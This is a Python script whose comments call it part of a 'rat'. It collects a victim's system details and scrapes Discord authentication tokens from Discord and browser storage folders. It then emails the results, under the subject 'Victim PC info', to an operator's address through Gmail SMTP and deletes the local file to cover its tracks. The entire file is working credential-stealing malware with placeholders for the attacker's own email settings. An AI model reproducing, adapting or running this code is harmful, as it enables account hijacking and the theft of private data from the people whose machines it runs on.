#Import libs and dependancies for getting system info and downloading rest of rat
import os, platform, socket, re, uuid, json
from datetime import datetime

#Import libs and dependancies for compiling and sending email
from email.message import EmailMessage
import smtplib

#Establishing variables and files
now = datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
info = ""
sender = "Sender email (REPLACE THIS)"
password = "Sender email password (REPLACE THIS)"
receiver = "Receiver email (REPLACE THIS)"
open("info.txt", "w")

#Crafting email
msg = EmailMessage()
msg['Subject'] = "Victim PC info"
msg['From'] = sender
msg['To'] = receiver
msg.set_content('PC Info below...')

#Find and append tokens to a variable
#Next two definition found at https://github.com/wodxgod/Discord-Token-Grabber/blob/master/token-grabber.py
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def dsctok():
    discord_token = ""
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                discord_token = {token}
        else:
            discord_token = "N/A"
    discord_token_str = "Discord Token: " + json.dumps(list(discord_token)) + "   "
    return discord_token_str

#Grab system info
#Found on stackoverflow.com/questions/3103178/how-to-get-the-system-info-with-python (Comment by YJDev)
def grabstminf():
    system_info = ""
    system = "System: " + platform.system()
    release = "Release: " + platform.release()
    version = "Version: " + platform.version()
    architecture = "Architecture: " + platform.machine()
    hostname = "Hostname: " + socket.gethostname()
    ip_add = "IP Address: " + socket.gethostbyname(socket.gethostname())
    mac_add = "Mac Address: " + ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    system_info = (system + "   " + release + "   " + version + "   " + architecture + "   " + hostname + "   " + ip_add + "   " + mac_add + "   ")
    print("Grabbed system info...")
    return system_info

info = dt_string + grabstminf() + dsctok()

#Create info.txt to contain info var gathered before
with open("info.txt", "w") as f:
    f.write(info)
print("Created info.txt and appended previously grabbed info...")

#Creating attachment
with open("info.txt", "rb") as f:
    file_data = f.read()
    file_name = f.name
msg.add_attachment(file_data, maintype="text", subtype="plain", filename=file_name)
print("Attached info.txt to email...")

#Establishing email
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(sender, password)
    smtp.send_message(msg)
print("Successfully sent email...")

#Deleting info.txt
os.remove("info.txt")
print("Deleted txt file...")
